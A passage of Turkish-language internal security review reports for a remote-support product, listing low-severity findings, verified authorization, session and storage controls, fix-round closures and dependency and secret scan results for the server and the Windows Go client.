Düzeltme: 403 dalında TX dışında `result: "fail"` audit satırı yazılsın (`action: user.permission_changed|user.updated`, `newValue: { denied: [...anahtarlar] }`; PII yok). (atanan: backend-dev)

### [DÜŞÜK] B-P9-6 Tenant pasif sonrası adım düşer ve tenant 30 sn içinde yeniden aktifleşirse kayıtlar/talepler yaşar — A04

Yer: `apps/server/src/tenants/service.ts:120-123` (commit sonrası `cancelRequests`/`revokeBindings`), `:127-135` (`reactivateTenant`); yedek süpürücü yalnız pasif tenant'a bakar (`apps/server/src/bindings/repo.ts:109`)
Sorun: Commit sonrası `revokeBindings` veya `cancelRequests` hata verirse yedek 30 sn süpürücüdür. Super Admin bu süre dolmadan firmayı yeniden aktif ederse süpürücü tenant'ı aktif görür. Pasif öncesi kayıtlar (device_bindings) ve bekleyen talepler geçerli kalır. Bu, mimari-e10 §3.4 vaadiyle ("pasif → kayıtlar geçersiz") çelişir. Odalar ve oturumlar etkilenmez (auth_sessions TX içinde iptal; `/ws/tech` 60 sn doğrulaması tenant pasifliğini yakalar).
Düzeltme: `reactivateTenant` TX'inde, tenant'ın son pasife alınma anından önce oluşturulmuş ve iptal edilmemiş kayıt/talepleri iptal edin. Daha basit seçenek: `revokeForTenant` ve `cancelAllForTenant`'ı pasif TX'ine taşıyın, commit sonrası yalnız bellek/soket adımları kalsın. (atanan: backend-dev)

## Doğrulanan kontroller (istek listesi)

- **Yetki yükseltme (AC-73):** `assertGrantable` etkin kümedeki DEĞİŞEN her anahtarı aktörde arıyor. Rol geçişinin varsayılanları (USER→ADMIN = tüm anahtarlar "verilir") ve kaldırma da kapsamda (`service.ts:97-104, 167-173`). Oluşturmada hedefin tüm etkin kümesi aranıyor (`:140`). Bilinmeyen anahtar zod'da 400 (`contracts/api/users.ts:66-71`), dolayısıyla gelecekte eklenecek bir anahtara önceden "tohum" atılamaz. `normalizeRows` tanım dışı anahtarları düşürüyor.
- **canManage:** Admin, etkin kümesi kendisini aşan hesabı PATCH/pasif/aktif edemiyor (`:51-55, 166, 218`). Eşit yetkili Admin'lerin birbirini yönetebilmesi tasarım gereği.
- **Kendi hesabı:** rol ve yetki değişimi 403, durum değişimi 403. Ad ve e-posta serbest (`:172, 217`).
- **Super Admin gizliliği:** `scoped()` ve `lockUser` `tenant_id = ? AND role IN ('ADMIN','USER')` kullanıyor (`users/repo.ts:30, 58`). Liste, doğrudan id ve PATCH SA hesabına 404 dönüyor. `MANAGED_ROLES` SUPER_ADMIN atamayı şemada engelliyor.
- **IDOR/tenant:** Tüm `/users` uçları `tenantScope(req)` kullanıyor. SA firma seçmeden erişemiyor. `resolveSession` acting tenant'ı yalnız ACTIVE ise kabul ediyor (`auth/session.ts:87`). `/admin/*` eklenti düzeyinde `requireAuth` → `requireSuperAdmin` hook'u ile korunuyor (`tenants/routes.ts:47-48`). Switch sonrası eski bağlamın panel soketleri `closeByAuthToken` ile kapanıyor.
- **Geçici şifre:** `crypto.randomInt`, 56 sembol × 16 ≈ 93 bit, yanlılık yok (`lib/ids.ts:40-47`). Yalnız 201 yanıtında dönüyor. Audit `newValue`'da yok, loglanmıyor (`Cache-Control: no-store`). `mustChangePassword: true` ve `requireAuth` kapısı devrede. Web'de yalnız bileşen durumunda; storage ya da URL'ye yazılmıyor. Dialog kapandıktan sonra yeniden gösterim yok. Pano yalnız kullanıcı tıklamasıyla kullanılıyor.
- **Oturum iptali (AC-115):** Pasife alma aynı TX'te `auth_sessions` iptali ve bekleyen KOD oturumlarını iptal ediyor. Commit sonrası `endByTechnician` + panel 4401 çalışıyor. Rol değişimi ve yetki daralmasında yetkiler her istekte DB'den yeniden hesaplanıyor (önbellek yok). Yedek `/ws/tech` 60 sn doğrulaması rol değişimini de yakalıyor (`signaling/ws.ts:231-236`). Talep oturumları admit kontrolünde pasif teknisyeni reddediyor (`signaling/admit.ts:127`).
- **Tenant pasif:** Aynı TX'te durum, tenant kullanıcılarının oturumları, bekleyen kod oturumları ve audit. Commit sonrası odalar, paneller, talepler ve kayıtlar ayrı ayrı try/catch içinde işleniyor. Biri düşse de diğerleri çalışıyor. Yedek yol süpürücüler (istisna B-P9-6).
- **Audit (AC-74):** Anahtar başına satır (kim/kime/permKey/eski→yeni), aynı TX. Şifre ve hash içermiyor. E-posta/ad PII'si standart gereği old/new içinde.
- **CSRF:** Tüm yazma uçları `requireAuth` → Origin allowlist + double-submit. Gövdesiz eylemler `z.strictObject({})`.
- **XSS:** P9 web dosyalarında `dangerouslySetInnerHTML`/`innerHTML` yok. Ad ve e-posta React metin düğümü olarak basılıyor. Ad şemasında kontrol ve görünmez karakter reddi var.
- **Enjeksiyon:** Ham SQL yalnız `$queryRaw` etiketli şablonla parametreli (`users/repo.ts:57`, `tenants/repo.ts:41, 85`).

## Otomatik tarama çıktıları

- `pnpm audit --prod`: **No known vulnerabilities found**.
- gitleaks v8.30.1 `dir` (`--config .gitleaks.toml --redact`):
  - `apps/server`: 1 bulgu → `src/lib/ids.ts:40` (yanlış pozitif, B-P9-1).
  - `apps/web`: 14 bulgu → 13'ü `.next/` derleme çıktısında (git-ignored, repoya girmez; Next preview anahtarları yerel derlemeye ait), 1'i `e2e/mock-users.mjs:172` (sahte değer, B-P9-1).
  - `packages`: bulgu yok.

## Tasarımda vaat edilip kodda bulunmayanlar

- mimari-e10 §3.4 "tenant pasif → kayıtlar geçersiz": hızlı yeniden aktifleştirme + adım hatası kesişiminde garanti yok (B-P9-6).
- Diğer P9 vaatleri (AC-70/71/72/73/74/115, G-04, `requireSuperAdmin`, SA gizliliği) kodda mevcut.

## Olumlu

- Yetki kuralı tek kaynaktan (`permissions.ts` → `effectivePermissions`/`roleDefaultGranted`). Normalize ezme satırları sayesinde yeni anahtar varsayılanı doğru akıyor.
- Hedef satır kilidi (`FOR UPDATE`) ve tüm yan etkilerin tek TX'te audit'le birlikte yazılması.
- Commit sonrası adımların bağımsız try/catch'i ve alarm etiketli loglar (`user_live_effect`, `tenant_passive_effect`).
- Geçici şifre UX'i: tek gösterim, kopyalanmadan kapatma uyarısı, güvenli varsayılan odak.

Öneri: B-P9-2..6, `docs/gereksinimler.md` §9'a "Sonra" olarak eklensin. B-P9-1 commit öncesi kapatılmalı (CI kapısı).

---

# Güvenlik Raporu — E10/P8c-2 — Kod turu 2 (2026-11-12)

DURUM: GEÇTİ (Kritik/Yüksek 0)
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 0 (+1 bilgi)

Kapsam: Bu tur dar kapsamlı. "Kod turu 1" bulgularının (B-P8c2-1, B-P8c2-2, B-P8c2-3) kapanışını ve `docs/implementation.md` "P8c-2 — düzeltme turu 1" notunu doğruluyor. Ayrıca S5 daraltmasının güvenlik etkisini değerlendiriyor. İncelenen dosyalar: `apps/agent-win/internal/request/run.go`, `flow/{flow,binding}.go`, `launch/run.go` ve sunucu tarafında karşılaştırma için `apps/server/src/signaling/binding.ts`. Testler tekrar koşulmadı. backend-dev notundaki sonuç esas alındı (18 paket ok, Windows vet temiz, yeniden üretilebilir derleme SHA-256 `5255edc8…`). Test fonksiyonlarının varlığı doğrulandı.

## Tur 1 bulgularının durumu

| Bulgu                                       | Durum                       | Kanıt                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| ------------------------------------------- | --------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| B-P8c2-1 (Düşük) her 404 kaydı siliyor      | **Kapandı**                 | `request/run.go:239`: status yolunda `bindingInvalid()` yalnız `ae.Code == "BINDING_INVALID"` iken çağrılıyor. `ae.Status == 404` koşulu kaldırıldı. Kodsuz veya başka kodlu 404 genel `infoProblem` yoluna düşüyor; kayıt korunuyor ve "Tekrar dene" gösteriliyor. Oluşturma yolu (`run.go:420`) zaten yalnız kodla çalışıyordu. Silme yalnız `launch/run.go:117` `OnBindingInvalid` üzerinden yapılıyor ve başka çağıran yok. Test: `request/home_test.go:109` `TestBP8c21Status404WithoutCodeKeepsBinding` (`NOT_FOUND`, `UNKNOWN`).        |
| B-P8c2-2 (Düşük) teklif aşama kontrolü yok  | **Kapandı**                 | `flow/binding.go:24`: `BindingOffer` yalnız `s.phase == phActive` iken işleniyor (ayrıca `!bindingDone && !bindingPending && conn != nil`). `phActive` yalnız `onHello` sonunda atanıyor (`flow.go:574`). Lobide (`phLobby`) ve yeniden bağlanırken (`phReconnecting`) gelen teklif yok sayılıyor. `BindingIssued` yalnız `bindingPending` iken yazılıyor; bu bayrak da yalnız aktif aşamadaki bir istekten sonra açılıyor. Böylece istenmemiş ya da lobi kaydı yazılamıyor. Test: `flow/binding_test.go:130` `TestBP8c22OfferInLobbyIgnored`. |
| B-P8c2-3 (Bilgi) `customerFirmName` varlığı | **Kapandı (kod gerekmedi)** | `decodeStrict` zorunlu alanın varlığını şart koşuyor. Alanın olmadığı fixture `signal.TestAC181BindingServerMessagesStrict` içinde reddediliyor (implementation notu, madde 5).                                                                                                                                                                                                                                                                                                                                                                |

## S5 daraltmasının değerlendirmesi — güvenlik etkisi yok

- **Kapsam doğru:** `flow/binding.go` `bindingErrorCodes = {FORBIDDEN, CONFLICT, RATE_LIMITED, INTERNAL}`. Bu küme, sunucunun `binding.request` yolunda gönderdiği kodlarla birebir aynı (`server/src/signaling/binding.ts:24,29,35,41,44`). Sunucu bu yolda başka bir kod göndermiyor. Biçim hatası protokol düzeyinde (1008) ele alınıyor.
- **Yutma yalnız istek bekliyorken ve tek seferlik:** `flow.go:509`, yalnız `s.bindingPending` iken ve küme içindeki kod geldiğinde çalışıyor. İlk eşleşmede bayrak kapanıyor. Diğer tüm `error` mesajları (`ADMIT_CODE_INVALID`, `NOT_FOUND`, `VALIDATION` ve beklemede olmayan dönemde gelen her kod) durum satırında gösteriliyor. Tur 1'deki "her error yutulur" geniş davranışına göre görünürlük arttı.
- **Güvenlik kontrolü atlatılamıyor:** Yutulan şey yalnız bir durum satırı metni. Oturumu sonlandıran ya da yetki iptal eden olaylar `error` mesajıyla değil, kapanış kodlarıyla (`ClosePolicy`, `CloseAuthRevoked` → `signal.Fatal`, `flow.go:382`) ve `session.ended` ile geliyor. Bunlar yutma yolundan geçmiyor. Kontrol isteği, izin kapısı (`gate`) ve kayıt yazma kararları `error` mesajına bağlı değil. Kayıt reddi sonrasında istemci yeni istek göndermiyor (`bindingPending=false` olsa da `bindingDone` yok; sunucu oturum başına en çok 3 istek kabul ediyor). Ret sonrası istek seli oluşmuyor çünkü yeni istek yalnız yeni bir `binding.offer` ile tetikleniyor.
- **Yanlış eşleşme etkisi:** İstek beklerken bağımsız bir yoldan aynı kümeden bir kod gelirse (şu an misafire bu kodları gönderen başka akış pratikte yok), yalnız o tek mesaj gösterilmez. Sonuç UX düzeyinde kalıyor, güvenlik etkisi yok.

### [BİLGİ] B-P8c2-4 `bindingPending` yeniden bağlanmada sıfırlanmıyor

Yer: `apps/agent-win/internal/flow/flow.go:388-395` (kopuş → `phReconnecting`), `flow/binding.go:24`.
Sorun: İstek gönderilip yanıt gelmeden soket koparsa `bindingPending` true kalıyor. Yeniden bağlanınca sunucunun yeni soketten gönderdiği teklif yok sayılıyor ve bu oturumda kayıt alınamıyor. Ayrıca sonraki ilk küme-içi `error` mesajı yutulabiliyor. Davranış fail-safe: kayıt yazılmıyor, anahtar sızmıyor. Sunucu eski isteğin sonucunu kapanmış sokete yazdığı için yeni sokette istenmemiş `issued` riski de yok.
Düzeltme (isteğe bağlı, backend-dev Go): Kopuşta (`s.phase = phReconnecting` satırında) `s.bindingPending = false` yapılmalı. "İstek → kopuş → yeniden bağlanma → yeni teklif → tek istek" testi eklenmeli. `docs/gereksinimler.md` §9'a "Sonra" olarak eklenebilir.

## Otomatik tarama çıktıları

Bu turda go.mod/go.sum ve JS bağımlılıkları değişmedi (implementation notu). Tarama tekrarlanmadı. Geçerli sonuçlar "Kod turu 1" ve "P8c-1 Kod turu 2" bölümlerinde.

## Tasarımda vaat edilip kodda bulunmayanlar

Yok. G-E10-5/6/9 ve "yalnız admitted oturumda istek" şartı artık hem sunucuda hem istemcide uygulanıyor.

## Olumlu

- Her iki düzeltme dar ve hedefli. Her biri adıyla izlenebilen bir regresyon testiyle kapatılmış.
- S5 kümesi sunucu koduyla birebir eşleşiyor ve tasarım belgesine referans veriyor.
- Kayıt silme kararı artık tek bir koda (`BINDING_INVALID`) bağlı. Altyapı kaynaklı 404'ler kullanıcının cihaz kaydını yok edemiyor.

---

# Güvenlik Raporu — E10/P8c-2 — Kod turu 1 (2026-11-12)

DURUM: GEÇTİ (Kritik/Yüksek 0)
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 2 (+1 bilgi)

Kapsam: Windows Go istemcisi 0.10.0 (`apps/agent-win`, commit edilmemiş değişiklikler): `internal/remember/{origin,data,remember,dpapi_windows}.go`, `internal/api/{bindings,requests,api}.go`, `internal/signal/messages.go`, `internal/flow/{flow,binding}.go`, `internal/launch/{decide,run,keeper}.go`, `internal/request/{run,home,types,wait,ws,validate}.go`, `internal/ui/home_windows.go`, `internal/win/win_windows.go` (OpenURL/OpenMailto). Tasarım şartları: G-E10-5, G-E10-6, G-E10-9 (aşağıdaki "E10/P8c — Tasarım turu"), mimari-e10 §8, §15, ADR-0017, ADR-0004 r4. Testler tekrar koşulmadı; backend-dev notundaki sonuç esas alındı (18 paket ok, Windows vet temiz).

## Karar: S1 sapması (IDNA kullanılmadı) — KABUL

`remember.CanonicalOrigin` (`internal/remember/origin.go:20-43`) Unicode host'u reddediyor; punycode (`xn--`) ve IP kabul ediliyor. Bu sapma kabul edilebilir:

- Anahtarın gideceği yer kökene göre seçilmiyor. Tüm istekler gömülü `cfg.ServerURL` tabanlı tek `api.Client`'tan (`api/api.go:187-188`) ve `signal.Dial(cfg.ServerURL)` üzerinden gidiyor. Köken karşılaştırması yalnız "dosyadaki kayıt bu sunucunun mu?" sorusunu yanıtlıyor (`launch/run.go:49,99`; `keeper.go:31`). Yanlış "eşit değil" sonucu fail-closed olur: anahtar gönderilmez, dosya da silinmez. Yanlış "eşit" sonucu ise imkânsız, çünkü iki taraf da aynı fonksiyondan geçen dizeler ve karşılaştırma dize eşitliği.
- Gömülü adres ASCII (`config.go:50`, yalnız `Host`), dolayısıyla bugünkü dağıtımda (remote.noktabilisim.net, staging IP:port) işlev kaybı yok. IDN alan adına geçilirse build.sh punycode adresle çağrılmalı. Bu satır runbook'a/`build.sh` yorumuna eklenmeli (devops, isteğe bağlı).
- `golang.org/x/text` için yeni modül eklemekten kaçınılması tedarik zinciri açısından olumlu.

## Bulgular (öncelik sırasıyla)

### [DÜŞÜK] B-P8c2-1 `bindings/status` yanıtındaki her 404, kodu ne olursa olsun yerel kaydı siliyor — A04 (erişilebilirlik)

Yer: `apps/agent-win/internal/request/run.go` `loadInfo`: `case r.d.BindingKey != "" && errors.As(err, &ae) && (ae.Code == "BINDING_INVALID" || ae.Status == 404): r.bindingInvalid()` → `launch/run.go` `OnBindingInvalid` → `Store.ClearBinding()`.
Sorun: Sunucu P8c öncesine geri alınırsa (mimari "geri alma güvenli" diyor), Fastify'ın rota yok yanıtı veya ara katmandaki bir proxy/Caddy 404'ü `BINDING_INVALID` gibi işleniyor. Sonuçta DB'de hâlâ geçerli olan kayıt istemcide kalıcı olarak siliniyor. Talep oluşturma yolu doğru yazılmış (yalnız `ae.Code == "BINDING_INVALID"`, `run.go` form switch). Güvenlik açığı değil. Etkisi, geri almadan sonra müşterinin yeniden kod oturumu yapması gerekmesi.
İstismar senaryosu: Saldırı yok. Sunucu geri alındığında veya yanlış yapılandırılmış bir proxy araya girdiğinde, kayıtlı tüm 0.10.0 istemciler ilk açılışta kaydını kaybeder.
Düzeltme (backend-dev Go): Status yolunda da yalnız `ae.Code == "BINDING_INVALID"` ile silinmeli. Başka bir 404 (kodsuz/`NOT_FOUND`) genel ağ/sunucu hatası sayılmalı ve kayıt korunmalı. `run_test.go`'ya "404 + code NOT_FOUND → ClearBinding çağrılmaz" testi eklenmeli.

### [DÜŞÜK] B-P8c2-2 `binding.offer` istemcide admit/aktif aşama kontrolü olmadan işleniyor — A04 (derinlemesine savunma)

Yer: `apps/agent-win/internal/flow/binding.go:15-24` (`onBinding`), `flow/flow.go` `onServer` (`case signal.BindingOffer, signal.BindingIssued`). Lobi aşamasındaki mesajlar da aynı `onServer`'dan geçiyor (`case signal.LobbyWait`).
Sorun: İstemci, teklifi oturumun `hello` almış olup olmadığına (`s.phase`) bakmadan yanıtlıyor. Bugün sunucu teklifi yalnız hello'dan sonra gönderiyor. Ayrıca ADMITTED olmayan sokette gelen `binding.request` 1008 ile kapatılıyor. Bu nedenle sömürülebilir bir yol yok. Görevdeki "yalnız admitted oturumda istek" şartı şu anda yalnız sunucuda uygulanıyor. Sunucu tarafında bir regresyon olursa lobideki istemci isteği gönderir ve 1008 ile oturumu kaybeder.
İstismar senaryosu: Doğrudan istismar yok. Bu kontrol yalnız tek katmanlı.
Düzeltme (backend-dev Go): `onBinding`'de `BindingOffer` yalnız hello sonrası (`s.phase == phActive` veya eşdeğer bayrak) işlenmeli, öncesi yok sayılmalı. `binding_test.go`'ya "lobide teklif → istek yok" testi eklenmeli.

### [BİLGİ] B-P8c2-3 `binding.issued.customerFirmName` alanı yokken de kabul ediliyor

Yer: `apps/agent-win/internal/signal/messages.go` `BindingIssued.CustomerFirmName *string` + `decodeValid`. Alan hiç gönderilmediğinde de `null` gibi işleniyor. Sözleşmede alan zorunlu ve nullable (`packages/contracts/src/ws.ts:231`). implementation.md "zorunlu/null" diyor, kod ise yalnız null kontrolü yapıyor. Güvenlik etkisi yok (sonuç "Genel" kayıt). Not olarak düşüldü. İstenirse `json.RawMessage` ile alanın varlığı denetlenebilir (backend-dev Go).

## Denetlenen kontroller (sorun yok)

- **Anahtar yalnız kanonik kökene:** `api.Client` yönlendirme takip etmiyor (`api/api.go:87-89` `CheckRedirect → ErrUseLastResponse`). 3xx yanıtı hata zarfı olarak döner ve gövde yeniden gönderilmez. Şema yalnız `https` (`config.go:50`). HTTP→HTTPS düşürme yolu yok. TLS ≥ 1.2, sistem kökleri, doğrulama gevşetilmiyor. `PreviousKey` (`keeper.go:28-34`), `BindingKey` talep modu (`launch/run.go:91-98`) ve "unut" sonrası revoke (`run.go:109`, `usable`) üçü de `local.Server == server` dize eşitliğine bağlı. Eşleşmeyen kayıt kullanılmıyor ve silinmiyor (T43). Anahtar URL'de değil, yalnız JSON gövdede taşınıyor (`api/bindings.go`).
- **CanonicalOrigin:** `https` dışı, userinfo, opaque, yol (`/` dışı), sorgu, `?` (ForceQuery), parça ve `#` reddediliyor. Boş port (`host:`) red, port 1..65535 aralığında, baştaki sıfırlar atılıyor. Host küçük harfe çevriliyor ve sondaki nokta siliniyor. LDH etiket kuralları ve ≤ 253 sınırı uygulanıyor. IP'ler `net.IP.String()` ile kanonik yazılıyor, IPv6 köşeli parantez içinde. `Binding.valid()` dosyadaki `Server`'ın zaten kanonik olmasını şart koşuyor (`data.go:96-99`).
- **DPAPI v2 dosyası:** CurrentUser, `CRYPTPROTECT_UI_FORBIDDEN`. Entropi ADR-0004 r4'e uygun olarak değişmedi (`dpapi_windows.go:13`). Konum `%LOCALAPPDATA%` (dolaşımsız). Şifreli boyut ≤ 16 KB, düz boyut ≤ 4 KB. `DisallowUnknownFields` ile katı ayrıştırma yapılıyor. Bilinmeyen sürüm, `deviceKey`↔`personal` tutarsızlığı, regex/uzunluk/kontrol karakteri ihlali ya da DPAPI hatası olursa dosya silinip "yok" sayılıyor (`remember.go:50-68`, `data.go:113-153`). v1 bellekte yükseltiliyor ve ilk yazım v2 oluyor. Yazma atomik: `.tmp` O_EXCL → Sync → Rename (Windows'ta MoveFileEx REPLACE_EXISTING), artık tmp temizleniyor. Oku-değiştir-yaz tek mutex altında. Dosya izni 0600/0700 Windows'ta etkisiz, ancak klasör `%LOCALAPPDATA%` kullanıcı ACL'sini miras alıyor. Bu yeterli.
- **G-E10-5:** `ClearPersonal` `deviceKey`'i de siliyor (S4). Kayıtla açılan talepte `deviceKey` gönderilmiyor (`run.go` `if keep && r.d.BindingKey == ""`). `Ref`/`BindingKey` `omitempty`.
- **Sızıntı:** Yeni paketlerde log çağrısı yok. `api.Error`/`net/http` hata metinlerinde yalnız URL var, anahtar yok. UI'da anahtar hiç gösterilmiyor. Test sabitleri sahte (`rsb_AAAA…`), gerçek anahtar yok.
- **"Bu bilgisayarı unut":** Önce `ForgetAll` (dosya + tmp, klasör boşsa o da) çalışıyor. Ardından yalnız aynı kökenli anahtar için 2 sn'lik tek denemeli revoke gidiyor. Son olarak `keeper.forget()` aynı süreçte `previousKey` gönderimini engelliyor (`launch/run.go:103-115`). Ağ hatası yerel silmeyi etkilemiyor.
- **binding.\* ayrıştırma:** `decodeStrict` + şema kontrolü (`bindingKeyRe`, tenant ≤ 120, müşteri ≤ 100 UTF-16) yapılıyor. Giden `BindingRequest.previousKey` regex ile doğrulanıyor. İstenmemiş `issued` yazılmıyor. Her teklife ≤ 1 istek gidiyor, kayıt alındıktan sonra gelen teklifler yok sayılıyor. İstekten sonraki `error` yutuluyor, oturum sürüyor (S5; bu sırada gelen ilgisiz bir hata da yalnız durum satırında gösterilmez, etkisi önemsiz).
- **BINDING_INVALID:** Oluşturma yolunda form kapanıyor, `ClearBinding` çalışıyor (kişisel bilgiler kalıyor) ve AC-185 ana ekranı açılıyor. Status yolu için B-P8c2-1'e bakın.
- **Sunucu metinleri:** Tenant ve müşteri adları dosyaya yazılmadan önce `request.Display` ile temizleniyor (`keeper.go:41-45`), ekranda da yine aynı fonksiyondan geçiyor (`run.go applyInfo`, `launch/run.go:99`). Kontrol, biçim ve bidi karakterleri atılıyor, satır sonları boşluğa çevriliyor. Dosyadan okunan değer `validText` ile ayrıca denetleniyor. `CUSTOMER_PASSIVE`/`BINDING_REVOKED` için neden gösterilmiyor, genel metin kullanılıyor.
- **OpenURL https-only korunuyor:** `win.OpenURL` `https://` öneki istiyor ve boşluk, tırnak ve CR/LF/TAB içeren adresi reddediyor. Tek çağıran `DownloadURL`, kayıt modunda `Ref` olmadığı için indirme düğmesi çıkmıyor. `OpenMailto` yalnız `ValidAbuseEmail` ile doğrulanmış adresi açıyor (değişmedi).
- **0.9.x uyumu:** 0.9.x istemci teklif almıyor (sunucuda sürüm kapısı var). 0.10.0 istemci eski sunucuya bağlanırsa teklif gelmiyor, kayıt istenmiyor ve `cancelReasons` genişlemesi zararsız kalıyor. Tek istisna B-P8c2-1 (status 404).

## Otomatik tarama çıktıları

- `govulncheck@v1.9.0` (docker `golang:1.26-bookworm`, `apps/agent-win`, `GOOS=windows` ve linux): **"Your code is affected by 0 vulnerabilities."** Gerekli modüllerde 3 bilinen zafiyet var, ancak bunları içeren kod yollarına çağrı yok (sembol düzeyinde 0).
- Gizli bilgi taraması (`git grep` kalıbı, `apps/agent-win`): eşleşme yok. Diff'te `rsb_` biçimli yalnız iki sahte test anahtarı var (`rsb_AAAA…`, `rsb_BBBB…`).
- go.mod/go.sum değişmedi, yeni bağımlılık yok.

## Tasarımda vaat edilip kodda bulunmayanlar

- IDNA normalleştirmesi (G-E10-6): S1 olarak kabul edildi (yukarıda). Unicode host'ta fail-closed davranıyor.
- "Yalnız admitted oturumda istek": yalnız sunucuda uygulanıyor (B-P8c2-2).

## Olumlu

- Köken kontrolü fail-closed tasarlanmış. Eşleşmeyen kayıt kullanılmıyor ama silinmiyor (staging/prod ikilileri aynı profilde birbirini bozmuyor).
- Redirect takibinin kapalı olması, anahtarın başka bir hosta gövdeyle yeniden gönderilmesini yapısal olarak engelliyor.
- Bozuk veya başka sürümden kalmış dosya kesin olarak reddediliyor. Atomik yazma kullanılıyor ve kişisel bölümle kayıt bölümü ayrı ayrı yönetiliyor.
- Saf `Decide` tablosu ve tablo testleri karar mantığını denetlenebilir kılıyor.
- Orta/Düşük bulguların (B-P8c2-1, B-P8c2-2) `docs/gereksinimler.md` §9'a "Sonra" olarak eklenmesi önerilir. B-P8c2-1 tek satırlık bir düzeltme olduğu için P8c-2 düzeltme turunda kapatılması tercih edilir.

---

# Güvenlik Raporu — E10/P8c-1 — Kod turu 2 (2026-11-12)

DURUM: GEÇTİ (Kritik/Yüksek 0)
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 2

Kapsam: Bu tur, "Kod turu 1" bulgularının (B-P8c-1..6) kapanışını ve `docs/implementation.md` "P8c-1 — düzeltme turu 1" notundaki değişiklikleri doğruluyor. İncelenen dosyalar: `bindings/{service,repo}.ts`, `customers/{repo,service}.ts`, `requests/{service,panel,routes}.ts`, `signaling/binding.ts`, `ops/metrics.ts`, `lib/db.ts` ve `test/integration/bindings-p8c.test.ts` (+13 test). Tur 1'de çalıştırılamayan `pnpm audit` ve gitleaks taramaları bu turda çalıştırıldı. Test koşusu tekrarlanmadı; backend-dev notundaki sonuç esas alındı (int 355/355, eşzamanlılık testi art arda 3 kez yeşil).

## Tur 1 bulgularının durumu

| Bulgu                                  | Durum       | Kanıt                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| -------------------------------------- | ----------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| B-P8c-1 (Orta) pasife alma yarışı      | **Kapandı** | Talep TX'inde `lockSettings` sonrasında `crepo.shareStatus` (FOR SHARE) çalışıyor; ACTIVE değilse ref yolunda `REQUEST_REF_INVALID`, kayıt yolunda `BINDING_INVALID` dönüyor (`requests/service.ts:300`). Kabul TX'inde müşteri, talep UPDATE'inden önce FOR SHARE ile okunuyor; pasifse `customer_passive` → `cancelSystem(CUSTOMER_PASSIVE)` + 409 `REQUEST_CLOSED` (`requests/panel.ts:123,148-150`). Pasife alma, bekleyen talepleri kendi TX'inde iptal ediyor (`customers/service.ts:267-281`). `shareStatus` durumu kilitli okumanın kendisinden döndürüyor (son commit), REPEATABLE READ anlık görüntüsü tuzağı yok. `repo.lock` FOR UPDATE'ten sonra `findUnique` yapıyor; pasife almanın anlık görüntüsü kilit alındıktan sonra kuruluyor ve beklediği talep TX'inin INSERT'ünü görüyor. Pencere kapandı. |
| B-P8c-2 (Orta) eksik r2 testleri       | **Kapandı** | `bindings-p8c.test.ts:356-432`: §15.3 sıralı ve `Promise.all` ile eşzamanlı istek; K20 `req.create.ip` 6. istekte 429 + audit; `req.create.binding` 6/sa; §15.1 (2)(3); AC-181 negatif yollar.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| B-P8c-3 (Düşük) revoke-binding yetkisi | **Kapandı** | `requests/routes.ts:66` artık `support_requests.view` + `customers.edit` istiyor; 403 testi var (`:482`).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| B-P8c-4 (Düşük) ret görünürlüğü        | **Kapandı** | `rs_binding_denied_total{reason}` sabit küme `stale_source\|inactive\|rate\|no_offer\|browser` (`ops/metrics.ts:63`, `signaling/binding.ts`). `stale_source` ve `inactive` ayrıca `binding.denied{reason}` audit'ine yazılıyor; audit seli oluşmuyor çünkü oturum başına en çok 3 istek var. Etiketlerde PII yok.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| B-P8c-5 (Düşük) biçim dışı anahtar     | **Kapandı** | `bindings/service.ts:55-58` ve `requests/service.ts:235-236`: biçim dışı anahtar → 404 `BINDING_INVALID` + `req.ref_invalid` kovası. Test, 11. denemede 429 dönüyor (`:436`).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| B-P8c-6 (Düşük) `cancelledRequests`    | **Kapandı** | Değer artık aynı TX'te gerçekten iptal edilen sayı (`ids.length`). Test `cancelledRequests: 2` doğruluyor.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |

## Eşzamanlılık düzeltmesinin değerlendirmesi (kilit sırası, yeniden deneme)

- **Yeniden denemenin güvenliği: sorun yok.** `issueBinding` en çok 2 deneme yapıyor (`bindings/service.ts:134`), yalnız UQ(`active_session_id`) ihlalinde ve geçici hatalarda (P2028/P2034, 1205/1213). `Denied` yeniden denenmiyor. Her denemede yeni anahtar üretiliyor ve ilk denemenin anahtarı hiç gönderilmiyor. Geri alınan TX'teki REPLACED/ISSUED audit'leri ve `revokeById` de birlikte geri alınıyor; metrikler commit sonrasında sayılıyor, yani çift sayım olmuyor. WS düzeyinde 3 istek/oturum sınırı denemeden önce sayılıyor (`signaling/binding.ts:31`). Bu yüzden yeniden deneme bir çoğaltma (amplification) aracı olarak kullanılamıyor. Hata yolunda istemciye yalnız `INTERNAL` gidiyor. Logdaki `err` ham anahtarı taşımıyor (DB'ye yalnız SHA-256 gidiyor).
- **`lockActiveOfSession` / `lockActiveByHash` / `renew`:** Sütunlar kilitli okumadan, `renew` ise tek bir `updateMany` ile yazılıyor ve count≠1 olursa hata veriyor. Doğru. `prev` başka tenant'a aitse `target` olarak kullanılmıyor (G-E10-4 korunuyor).
- **Kilit sırası:** Talep oluşturma (`settings X → customers S → device_bindings/support_requests`), kabul (`users → customers S → support_requests`), oturum müşterili kayıt verme (`customers S → device_bindings X`) ve pasife alma/yenileme (`customers X → device_bindings/support_requests`) aynı yönde ilerliyor. Bu yollarda döngü yok. **İstisna §15.4 yolu:** bkz. B-P8c2-2.

## Bulgular (öncelik sırasıyla)

